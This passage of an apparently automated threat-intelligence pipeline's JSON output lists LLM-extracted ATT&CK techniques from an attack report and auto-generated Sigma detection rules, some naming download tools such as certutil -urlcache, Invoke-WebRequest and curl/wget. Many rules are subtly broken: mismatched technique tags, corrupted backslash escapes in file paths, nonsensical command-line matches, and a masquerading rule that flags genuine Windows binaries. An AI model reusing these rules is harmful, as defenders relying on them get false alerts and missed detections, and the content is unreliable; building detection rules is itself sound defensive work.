          "PING",
          "reg",
          "sc",
          "msiexec",
          "svchost.exe",
          "ftp",
          "net",
          "cmd"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "72fcc7d8-f1e2-4a3c-abbb-da16bb805a7f",
        "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
        "technique_name": "Web Service Exploitation",
        "attack_id": "T1102",
        "tactic": "Command and Control",
        "description": "Use of legitimate domains as C2 servers",
        "confidence_score": 0.652,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.161,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "C2 server domains",
          "legitimate domains"
        ],
        "tools": [
          "skypeserver.exe",
          "at",
          "PING",
          "reg",
          "sc",
          "msiexec",
          "svchost.exe",
          "ftp",
          "net",
          "cmd"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "df310818-5acd-4f4a-b2ed-7e3176e3cc30",
        "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
        "technique_name": "File Deletion",
        "attack_id": "T1070.004",
        "tactic": "Defense Evasion",
        "description": "Delete execution artifacts and change the file name randomly",
        "confidence_score": 0.649,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.9,
          "ioc_evidence": 0.58,
          "description_detail": 0.207,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "file deletion",
          "random file name change"
        ],
        "tools": [
          "at",
          "PING",
          "reg",
          "malware",
          "msiexec",
          "sc",
          "net",
          "ftp",
          "cmd"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "db098f08-2e54-4504-a9b1-61ef5fc49e1e",
        "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
        "technique_name": "Software Deployment Tools",
        "attack_id": "T1072",
        "tactic": "Execution",
        "description": "Loader and malware deployment",
        "confidence_score": 0.648,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.62,
          "description_detail": 0.092,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "conti",
          "loader",
          "malware"
        ],
        "tools": [
          "conti",
          "loader",
          "at",
          "PING",
          "reg",
          "malware",
          "msiexec",
          "sc",
          "net",
          "ftp",
          "cmd"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "c14cc87a-0e9c-4117-899c-237a69690dff",
        "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
        "technique_name": "Application Layer Protocol",
        "attack_id": "T1071.001",
        "tactic": "Command and Control",
        "description": "Use of web protocols for C2 communication",
        "confidence_score": 0.648,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.9,
          "ioc_evidence": 0.58,
          "description_detail": 0.199,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "C2 server communication",
          "web protocols"
        ],
        "tools": [
          "skypeserver.exe",
          "at",
          "PING",
          "reg",
          "sc",
          "msiexec",
          "svchost.exe",
          "ftp",
          "net",
          "cmd"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "3158034a-e54f-4c31-9192-1009adb5fc4e",
        "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
        "technique_name": "Command and Scripting Interpreter",
        "attack_id": "T1059.003",
        "tactic": "Execution",
        "description": "Use of Windows Command Shell to run perlcritic.exe",
        "confidence_score": 0.646,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.9,
          "ioc_evidence": 0.58,
          "description_detail": 0.184,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "cmd.exe",
          "perlcritic.exe"
        ],
        "tools": [
          "cmd.exe",
          "at",
          "PING",
          "reg",
          "sc",
          "perlcritic.exe",
          "msiexec",
          "net",
          "ftp",
          "cmd"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "08e0901d-1678-4832-87c5-e87bf752be2b",
        "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
        "technique_name": "Exploitation for Privilege Escalation",
        "attack_id": "T1068",
        "tactic": "Privilege Escalation",
        "description": "Use of PROCEXP152.sys for privilege escalation",
        "confidence_score": 0.643,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.138,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "PROCEXP152.sys"
        ],
        "tools": [
          "at",
          "PING",
          "reg",
          "sc",
          "msiexec",
          "PROCEXP152.sys",
          "net",
          "ftp",
          "cmd"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "ef85d929-a23e-4af8-9178-49bcc3fb20ab",
        "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
        "technique_name": "Network Service Discovery",
        "attack_id": "T1046",
        "tactic": "Discovery",
        "description": "Use of fswss.exe for network discovery",
        "confidence_score": 0.643,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.138,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "fswss.exe"
        ],
        "tools": [
          "at",
          "fswss.exe",
          "PING",
          "reg",
          "sc",
          "msiexec",
          "net",
          "ftp",
          "cmd"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "78ae8d8f-d6bf-45ed-9ef8-5e2029f42f8a",
        "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
        "technique_name": "Create or Modify System Process",
        "attack_id": "T1543",
        "tactic": "Persistence",
        "description": "Detected Create or Modify System Process activity via NLP pattern matching",
        "confidence_score": 0.64,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.246,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "at",
          "PING",
          "reg",
          "sc",
          "msiexec",
          "net",
          "ftp",
          "cmd"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "c1cf319b-81d0-48ef-880b-24e9182dfc9e",
        "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
        "technique_name": "Impair Defenses",
        "attack_id": "T1562.001",
        "tactic": "Defense Evasion",
        "description": "Disable or modify V3 security product",
        "confidence_score": 0.639,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.9,
          "ioc_evidence": 0.58,
          "description_detail": 0.138,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "V3",
          "Exploit/Win.Lazardoor.GEN"
        ],
        "tools": [
          "at",
          "PING",
          "Exploit/Win.Lazardoor.GEN",
          "reg",
          "sc",
          "msiexec",
          "net",
          "ftp",
          "cmd"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "8251a868-8fec-42aa-b982-1e18faf372db",
        "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
        "technique_name": "Process Injection",
        "attack_id": "T1055",
        "tactic": "Defense Evasion",
        "description": "Detected Process Injection activity via NLP pattern matching",
        "confidence_score": 0.636,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.214,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "at",
          "PING",
          "reg",
          "sc",
          "msiexec",
          "net",
          "ftp",
          "cmd"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "a1d5ec56-6075-419f-b718-941821f4aec6",
        "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
        "technique_name": "Application Layer Protocol",
        "attack_id": "T1071",
        "tactic": "Command And Control",
        "description": "Detected Application Layer Protocol activity via NLP pattern matching",
        "confidence_score": 0.633,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.199,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "at",
          "PING",
          "reg",
          "sc",
          "msiexec",
          "net",
          "ftp",
          "cmd"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "07f9fd66-bfae-49d8-99b2-f3243e4c322c",
        "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
        "technique_name": "Command and Scripting Interpreter",
        "attack_id": "T1059",
        "tactic": "Execution",
        "description": "Detected Command and Scripting Interpreter activity via NLP pattern matching",
        "confidence_score": 0.631,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.185,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "at",
          "PING",
          "reg",
          "sc",
          "msiexec",
          "net",
          "ftp",
          "cmd"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "f1300286-6f95-4d57-b1f1-9aab54deb180",
        "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
        "technique_name": "Command and Control",
        "attack_id": "T1071",
        "tactic": "Command and Control",
        "description": "C2 communication",
        "confidence_score": 0.629,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.046,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "C2 communication"
        ],
        "tools": [
          "at",
          "PING",
          "reg",
          "malware",
          "msiexec",
          "sc",
          "net",
          "ftp",
          "cmd"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "57596d7a-fb07-4d3b-9303-590d25be1293",
        "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
        "technique_name": "Exploit Public-Facing Application",
        "attack_id": "T1190",
        "tactic": "Initial Access",
        "description": "Detected Exploit Public-Facing Application activity via NLP pattern matching",
        "confidence_score": 0.628,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.162,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "at",
          "PING",
          "reg",
          "sc",
          "msiexec",
          "net",
          "ftp",
          "cmd"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "5e3c8a86-ac12-406e-9a84-46dae5bdc1ec",
        "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
        "technique_name": "Network Service Discovery",
        "attack_id": "T1046",
        "tactic": "Discovery",
        "description": "Detected Network Service Discovery activity via NLP pattern matching",
        "confidence_score": 0.628,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.162,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "at",
          "PING",
          "reg",
          "sc",
          "msiexec",
          "net",
          "ftp",
          "cmd"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "33c41cff-e13a-44cb-9f46-06701b92c1f6",
        "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
        "technique_name": "Archive Collected Data",
        "attack_id": "T1560",
        "tactic": "Collection",
        "description": "Detected Archive Collected Data activity via NLP pattern matching",
        "confidence_score": 0.628,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.162,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "at",
          "PING",
          "reg",
          "sc",
          "msiexec",
          "net",
          "ftp",
          "cmd"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "3872124e-d3fb-4d89-89b8-7c4b559776f9",
        "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
        "technique_name": "Indicator Removal",
        "attack_id": "T1070.006",
        "tactic": "Defense Evasion",
        "description": "Timestomping of malicious files",
        "confidence_score": 0.626,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.9,
          "ioc_evidence": 0.54,
          "description_detail": 0.092,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "malicious file timestamps"
        ],
        "tools": [
          "at",
          "PING",
          "reg",
          "sc",
          "msiexec",
          "svchost.exe",
          "ftp",
          "net",
          "cmd"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "57e1d081-21d2-48c3-af23-ef5c60ec12ee",
        "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
        "technique_name": "Remote Services",
        "attack_id": "T1021",
        "tactic": "Lateral Movement",
        "description": "Detected Remote Services activity via NLP pattern matching",
        "confidence_score": 0.624,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.139,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "at",
          "PING",
          "reg",
          "sc",
          "msiexec",
          "net",
          "ftp",
          "cmd"
        ],
        "extraction_method": "nlp_indicator"
      }
    ]
  },
  "rules": {
    "status": "success",
    "summary": {
      "ttps_processed": 29,
      "rules_generated": 29,
      "langchain_generations": 58,
      "fallback_generations": 0,
      "errors": 0,
      "processing_time_ms": 31950.823
    },
    "rule_generation_results": [
      {
        "ttp_id": "unknown",
        "technique_name": "Lateral Movement",
        "status": "success",
        "rule": {
          "title": "Lateral Movement using 0-Day Vulnerability of Company A's Certificate Program",
          "description": "Detects lateral movement using 0-Day vulnerability of company A's certificate program",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection1": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "company A",
                "certificate"
              ]
            },
            "selection2": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": [
                "company A",
                "certificate"
              ]
            },
            "condition": "selection1 or selection2"
          },
          "falsepositives": [
            "Legitimate use of company A's certificate program",
            "False positives may occur due to similar command line arguments used by other applications"
          ],
          "level": "high",
          "tags": [
            "attack.lateral_movement",
            "attack.t1560",
            "custom.company A",
            "custom.certificate program"
          ],
          "ttp_id": "unknown",
          "technique_name": "Lateral Movement",
          "generation_method": "langchain",
          "id": "311f9678-d4a8-4a72-8964-6752a1dc7070"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Anti-Forensics",
        "status": "success",
        "rule": {
          "title": "Anti-Forensics and Timestamp Operation Detection",
          "description": "Detects potential anti-forensics and timestamp operation techniques",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_timestomp": {
              "Image|endswith": [
                "\timestomp.exe",
                "\\sdelete.exe"
              ],
              "CommandLine|contains": [
                "-z",
                "-c"
              ]
            },
            "selection_filewipe": {
              "Image|endswith": [
                "\\sdelete.exe"
              ],
              "CommandLine|contains": [
                "-p",
                "-s"
              ]
            },
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "Get-ChildItem",
                "Set-ItemProperty",
                "Remove-Item"
              ]
            },
            "condition": "selection_timestomp or selection_filewipe or selection_powershell"
          },
          "falsepositives": [
            "Legitimate system administration tasks",
            "Backup and archiving software"
          ],
          "level": "medium",
          "tags": [
            "attack.defense_evasion",
            "attack.t1562",
            "custom.anti-forensics",
            "custom.timestamp operation"
          ],
          "ttp_id": "unknown",
          "technique_name": "Anti-Forensics",
          "generation_method": "langchain",
          "id": "da18c1a8-1c44-4709-891e-6c8b0e7c4b70"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "status": "success",
        "rule": {
          "title": "Command and Scripting Interpreter",
          "description": "Detects use of command line tools such as PING, at, cmd, net, reg",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_cmd": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": [
                "/c",
                "start",
                "echo",
                ">",
                ">>"
              ]
            },
            "selection_net": {
              "Image|endswith": "\net.exe",
              "CommandLine|contains": [
                "net",
                "start",
                "stop",
                "pause"
              ]
            },
            "selection_reg": {
              "Image|endswith": "\reg.exe",
              "CommandLine|contains": [
                "reg",
                "add",
                "delete",
                "query"
              ]
            },
            "selection_at": {
              "Image|endswith": "\u0007t.exe",
              "CommandLine|contains": [
                "at",
                "/delete",
                "/yes"
              ]
            },
            "selection_ping": {
              "Image|endswith": "\\ping.exe",
              "CommandLine|contains": [
                "ping",
                "-n",
                "-w"
              ]
            },
            "condition": "selection_cmd or selection_net or selection_reg or selection_at or selection_ping"
          },
          "falsepositives": [
            "Legitimate system administration tasks",
            "Software installation and updates"
          ],
          "level": "medium",
          "tags": [
            "attack.execution",
            "attack.t1562",
            "custom.command and scripting interpreter"
          ],
          "ttp_id": "unknown",
          "technique_name": "Command and Scripting Interpreter",
          "generation_method": "langchain",
          "id": "688b2663-701f-4b20-a6da-08cb781dcf8e"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Exploitation for Privilege Escalation",
        "status": "success",
        "rule": {
          "title": "Exploitation for Privilege Escalation via Public Certificate Software",
          "description": "Detects exploitation of 0-Day vulnerability in public certificate software for privilege escalation",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection1": {
              "Image|endswith": "\\certutil.exe",
              "CommandLine|contains": [
                "-f",
                "-urlcache"
              ]
            },
            "selection2": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "Invoke-WebRequest",
                "Invoke-RestMethod"
              ]
            },
            "selection3": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": [
                "certutil",
                "http"
              ]
            },
            "condition": "selection1 or selection2 or selection3"
          },
          "falsepositives": [
            "Legitimate use of certutil for certificate management",
            "PowerShell scripts using Invoke-WebRequest for legitimate purposes"
          ],
          "level": "high",
          "tags": [
            "attack.privilege_escalation",
            "attack.t1567",
            "exploitation.for_privilege_escalation",
            "custom.sigma"
          ],
          "ttp_id": "unknown",
          "technique_name": "Exploitation for Privilege Escalation",
          "generation_method": "langchain",
          "id": "b965a7c9-cf83-4a0a-ac70-9157123b9d43"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Disable or Evade Security Tools",
        "status": "success",
        "rule": {
          "title": "Disable or Evade Security Tools via BYOVD",
          "description": "Detects the exploitation of a vulnerable driver kernel module using the BYOVD technique to defeat security products",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection1": {
              "Image|endswith": "\\sysmon.exe",
              "CommandLine|contains": "BYOVD"
            },
            "selection2": {
              "Image|endswith": "\\csrss.exe",
              "CommandLine|contains": "vulnerable driver kernel module"
            },
            "condition": "selection1 or selection2"
          },
          "falsepositives": [
            "Legitimate system administration tasks",
            "False positives may occur due to similar command line arguments used by legitimate system processes"
          ],
          "level": "high",
          "tags": [
            "attack.defense_evasion",
            "attack.t1562",
            "custom.BYOVD",
            "custom.vulnerable driver kernel module"
          ],
          "ttp_id": "unknown",
          "technique_name": "Disable or Evade Security Tools",
          "generation_method": "langchain",
          "id": "ff9088b9-175d-4f7e-a549-fc9f93d0d214"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Exploitation of Public-Facing Application",
        "status": "success",
        "rule": {
          "title": "Exploitation of Public-Facing Application",
          "description": "Detects exploitation of public certificate software vulnerability",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection1": {
              "Image|endswith": "\rundll32.exe",
              "CommandLine|contains": ".dll"
            },
            "selection2": {
              "Image|endswith": "\regsvr32.exe",
              "CommandLine|contains": "http://"
            },
            "selection3": {
              "Image|endswith": "\\msiexec.exe",
              "CommandLine|contains": "/quiet"
            },
            "condition": "selection1 or selection2 or selection3"
          },
          "falsepositives": [
            "Legitimate software installations",
            "System updates"
          ],
          "level": "high",
          "tags": [
            "attack.initial_access",
            "attack.t1566",
            "exploitation.of.public-facing.application"
          ],
          "ttp_id": "unknown",
          "technique_name": "Exploitation of Public-Facing Application",
          "generation_method": "langchain",
          "id": "fa16c117-c3b8-49fc-9c19-a2f3decb052a"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Masquerading",
        "status": "success",
        "rule": {
          "title": "Masquerading as System File",
          "description": "Detects masquerading as system file by using the same file name as the system file name",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_system_file": {
              "Image|endswith": [
                "\\cmd.exe",
                "\\powershell.exe",
                "\\cscript.exe",
                "\\wscript.exe"
              ]
            },
            "selection_masquerade": {
              "Image|startswith": "C:\\Windows\\"
            },
            "condition": "selection_system_file and selection_masquerade"
          },
          "falsepositives": [
            "Legitimate system file execution",
            "Administrative tasks"
          ],
          "level": "medium",
          "tags": [
            "attack.defense_evasion",
            "attack.t1564.003",
            "custom.masquerading"
          ],
          "ttp_id": "unknown",
          "technique_name": "Masquerading",
          "generation_method": "langchain",
          "id": "c4d8383d-72ae-487d-b618-dabb05976324"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Exploitation for Client Execution",
        "status": "success",
        "rule": {
          "title": "Exploitation for Client Execution via Certificate Software Vulnerability",
          "description": "Detects exploitation of certificate software vulnerabilities for client execution",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection1": {
              "Image|endswith": "\\svchost.exe",
              "ParentImage|endswith": "\ftp.exe"
            },
            "selection2": {
              "Image|endswith": "\ftp.exe",
              "CommandLine|contains": [
                "-v",
                "-s"
              ]
            },
            "selection3": {
              "Image|endswith": "\\AppCrash.exe"
            },
            "condition": "selection1 or selection2 or selection3"
          },
          "falsepositives": [
            "Legitimate system administration tasks",
            "Software updates or installations"
          ],
          "level": "high",
          "tags": [
            "attack.execution",
            "attack.t1569",
            "custom.exploitation",
            "custom.certificate software vulnerability"
          ],
          "ttp_id": "unknown",
          "technique_name": "Exploitation for Client Execution",
          "generation_method": "langchain",
          "id": "c2e9f729-84b8-4bfb-8db4-7dc19e06cfac"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Indicator Removal",
        "status": "success",
        "rule": {
          "title": "Indicator Removal via Prefetch and Crash Dump File Deletion",
          "description": "Detects deletion of Prefetch files and crash dump files to evade detection",
          "logsource": {
            "category": "file_event",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_prefetch_deletion": {
              "TargetFilename|endswith": ".pf",
              "EventID": "23"
            },
            "selection_crash_dump_deletion": {
              "TargetFilename|endswith": ".dmp",
              "EventID": "23"
            },
            "condition": "selection_prefetch_deletion or selection_crash_dump_deletion"
          },
          "falsepositives": [
            "legitimate system file cleanup",
            "disk space management"
          ],
          "level": "medium",
          "tags": [
            "attack.defense_evasion",
            "attack.t1565",
            "attack.indicator_removal"
          ],
          "ttp_id": "unknown",
          "technique_name": "Indicator Removal",
          "generation_method": "langchain",
          "id": "3752b7e7-e6d2-4aaa-8dda-8a4c4a4be6c8"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Indicator Removal",
        "status": "success",
        "rule": {
          "title": "Indicator Removal via Suspicious Process Creation",
          "description": "Detects deletion of malicious files by suspicious processes",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_file_deletion": {
              "Image|endswith": [
                "\\cmd.exe",
                "\\powershell.exe"
              ],
              "CommandLine|contains": [
                "del",
                "rm",
                "erase"
              ]
            },
            "selection_suspicious_processes": {
              "Image|endswith": [
                "\\sfbappsdk.dll",
                "\fswss.exe",
                "\fmSysN.exe",
                "\\skypeserver.exe",
                "\\perlcritic.exe",
                "\\perlcritic64.exe"
              ]
            },
            "condition": "selection_file_deletion and selection_suspicious_processes"
          },
          "falsepositives": [
            "Legitimate file deletion by system administrators",
            "False positives from antivirus software"
          ],
          "level": "high",
          "tags": [
            "attack.defense_evasion",
            "attack.t1562",
            "attack.indicator_removal"
          ],
          "ttp_id": "unknown",
          "technique_name": "Indicator Removal",
          "generation_method": "langchain",
          "id": "d9acf33b-93dd-4cfa-acfb-a7fc1898b997"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Exploitation of Remote Services",
        "status": "success",
        "rule": {
          "title": "Exploitation of Remote Services via Certificate Software Vulnerability",
          "description": "Detects exploitation of certificate software vulnerabilities for lateral movement",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection1": {
              "Image|endswith": "\\svchost.exe",
              "ParentImage|endswith": "\\services.exe"
            },
            "selection2": {
              "Image|endswith": "\\svchost.exe",
              "CommandLine|contains": [
                "-k",
                "netsvcs"
              ]
            },
            "condition": "selection1 or selection2"
          },
          "falsepositives": [
            "Legitimate system services",
            "System updates or maintenance tasks"
          ],
          "level": "high",
          "tags": [
            "attack.lateral_movement",
            "attack.t1569",
            "custom.exploitation_of_remote_services"
          ],
          "ttp_id": "unknown",
          "technique_name": "Exploitation of Remote Services",
          "generation_method": "langchain",
          "id": "0446d526-f451-4f57-a0dd-940852428bec"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Web Service Exploitation",
        "status": "success",
        "rule": {
          "title": "Web Service Exploitation via Legitimate Domains",
          "description": "Detects potential web service exploitation using legitimate domains as C2 servers",
          "logsource": {
            "category": "network_connection",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_http": {
              "DestinationPort": 80,
              "UserAgent|contains": [
                "Mozilla/",
                "Chrome/",
                "Safari/"
              ]
            },
            "selection_https": {
              "DestinationPort": 443,
              "UserAgent|contains": [
                "Mozilla/",
                "Chrome/",
                "Safari/"
              ]
            },
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "Invoke-WebRequest",
                "-Uri"
              ]
            },
            "selection_cmd": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": [
                "curl",
                "wget"
              ]
            },
            "condition": "selection_http or selection_https or selection_powershell or selection_cmd"
          },
          "falsepositives": [
            "Legitimate web browsing traffic",
            "Software updates"
          ],
          "level": "medium",
          "tags": [
            "attack.command_and_control",
            "attack.t1566",
            "attack.web_service_exploitation"
          ],
          "ttp_id": "unknown",
          "technique_name": "Web Service Exploitation",
          "generation_method": "langchain",
          "id": "c5442cec-9d6f-447e-9e34-f8f3f75fb170"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "File Deletion",
        "status": "success",
        "rule": {
          "title": "File Deletion via System Commands",
          "description": "Detects file deletion using system commands to evade detection",
          "logsource": {
            "category": "file_event",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_delete_file": {
              "Image|endswith": [
                "\\cmd.exe",
                "\\powershell.exe"
              ],
              "CommandLine|contains": [
                "del",
                "rm",
                "erase"
              ]
            },
            "selection_rename_file": {
              "Image|endswith": [
                "\\cmd.exe",
                "\\powershell.exe"
              ],
              "CommandLine|contains": [
                "ren",
                "rename-item"
              ]
            },
            "condition": "selection_delete_file or selection_rename_file"
          },
          "falsepositives": [
            "legitimate file deletion by system administrators",
            "file deletion by backup software"
          ],
          "level": "medium",
          "tags": [
            "attack.defense_evasion",
            "attack.t1565",
            "custom.mitre_file_deletion"
          ],
          "ttp_id": "unknown",
          "technique_name": "File Deletion",
          "generation_method": "langchain",
          "id": "c6d7771d-6962-4716-aaac-c4eb58f4c26e"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Software Deployment Tools",
        "status": "success",
        "rule": {
          "title": "Software Deployment Tools Detection",
          "description": "Detects potential software deployment tools used for loader and malware deployment",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection1": {
              "Image|endswith": "\\cmd.exe",
              "ParentImage|endswith": "\\explorer.exe"
            },
            "selection2": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "Invoke-WebRequest"
            },
            "selection3": {
              "Image|endswith": "\rundll32.exe",
